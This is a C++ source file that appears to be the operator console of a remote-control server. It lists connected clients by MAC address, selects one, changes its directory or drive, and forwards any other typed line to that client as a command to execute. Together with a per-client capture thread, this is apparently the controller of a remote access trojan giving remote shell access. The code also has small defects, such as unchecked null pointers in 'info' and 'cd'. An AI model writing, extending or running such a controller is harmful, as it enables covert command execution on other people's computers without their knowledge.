#include "Control.h"

#define EXIT_CMD "exit()"
#define SELECT_USER_CMD "select"
#define LIST_USERS_CMD "list"
#define GET_CURRENT_USER_CMD "current"
#define GET_INFO_USER_CMD "info"
#define SET_CMD_DIRECTORY "cd"

void execLine(map<int, Client*>* clients, Client** current, const string& line) 
{
	if (line == EXIT_CMD) {
		if ((*current) != NULL) {
			(*current) = NULL;
			cout << "EXIT SUCCES, NO USER SELECTED";
		}
		else {
			cout << "ANY CLIENT SELECTED, use (" SELECT_USER_CMD " <<id>>)";
		}
		return;
	}

	else if (line[1] == ':' && line.length() == 2) {	// Change disk: ex -> C:
		if ((*current) != NULL) {
			_send((*current)->conn, SocketTag::SET_CMD_DISK, line);
		}
		else {
			cout << "ANY CLIENT SELECTED, use (" SELECT_USER_CMD " <<id>>)";
		}
	}

	else if (line.substr(0, strlen(LIST_USERS_CMD)) == LIST_USERS_CMD) {
		cout << "----------------------" << endl;
		for (map<int, Client*>::iterator it = (*clients).begin(); it != (*clients).end(); it++) {
			Client* c = (*clients)[it->first];
			cout.width(5); cout << left << c->id;
			cout.width(17); cout << right << c->mac;
			cout << endl;
		}
		cout << "----------------------";
		return;
	}

	else if (line.substr(0, strlen(GET_CURRENT_USER_CMD)) == GET_CURRENT_USER_CMD) {
		if ((*current) != NULL) {
			cout << "CURRENT USER [" << (*current)->id << "]" << endl;
		}
		else {
			cout << "ANY CLIENT SELECTED, use (" SELECT_USER_CMD " <<id>>)";
		}
		return;
	}

	else if (line.substr(0, strlen(SELECT_USER_CMD)) == SELECT_USER_CMD && line.length() >= strlen(SELECT_USER_CMD) + 2) {
		int id = string_to_int(line.substr(strlen(SELECT_USER_CMD) + 1, line.length()));
		if ((*clients).find(id) != (*clients).end()) {
			(*current) = (*clients)[id];
			cout << "USER [" << (*current)->id << "] SELECTED";
		}
		else {
			cout << "USER '" << id << "' NOT FOUND";
		}
		return;
	}

	else if (line.substr(0, strlen(GET_INFO_USER_CMD)) == GET_INFO_USER_CMD && line.length() >= strlen(GET_INFO_USER_CMD) + 2) {
		int id = string_to_int(line.substr(strlen(GET_INFO_USER_CMD) + 1, line.length()));
		Client* c = (*clients)[id];
		cout << "INFO [" << c->id << "]:" << endl;
		cout << "\tSOCKET: " << c->conn << endl;
		cout << "\tHANDLE: " << c->captureThreadHandle << endl;
		cout << "\tMAC: " << c->mac << endl;
		_send((*current)->conn, SocketTag::GET_CMD_DIR, "");
		return;
	}

	else if (line.substr(0, strlen(SET_CMD_DIRECTORY)) == SET_CMD_DIRECTORY && line.length() >= strlen(SET_CMD_DIRECTORY) + 2) {
		if (current != NULL) {
			string dir = line.substr(strlen(SET_CMD_DIRECTORY) + 1, line.length());
			_send((*current)->conn, SocketTag::SET_CMD_DIR, dir);
		}
		else {
			cout << "ANY CLIENT SELECTED, use (" SELECT_USER_CMD " <<id>>)";
		}
		return;
	}

	else {
		if ((*current) != NULL) {
			_send((*current)->conn, SocketTag::EXEC, line);
		}
		else {
			cout << "INVALID COMMAND '" << line << "'";
		}
	}
}

void inputController(map<int, Client*>* clients)
{
	Client* current = NULL;

	string line;
	while (true) {
		getline(cin, line);
		execLine(clients, &current, line);
		cout << endl << endl;
	}
}